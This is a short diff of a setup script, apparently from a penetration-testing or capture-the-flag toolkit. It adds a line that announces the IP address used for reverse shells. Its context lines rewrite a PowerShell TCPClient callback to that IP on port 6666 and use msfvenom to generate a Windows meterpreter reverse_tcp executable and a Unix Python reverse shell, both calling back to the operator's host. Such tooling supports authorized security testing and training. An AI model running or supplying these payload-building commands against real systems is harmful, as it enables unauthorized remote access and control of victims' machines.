@@ -66,6 +66,7 @@ sed -i "s|TCPClient('.*', [0-9]\+)|TCPClient('$IP', 6666)|" "$SCRIPT"
 
 
 echo "Creating reverse shells..."
+echo "USING $IP for reverse shells! If this is incorrect please execute the script 'createreverseshells.sh' in the Tools folder with the right IP!"
 
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=$IP LPORT=7777 -o ./Tools/revshell.exe
 msfvenom -p cmd/unix/reverse_python LHOST=$IP LPORT=8888 -f raw > ./Tools/revshell.py
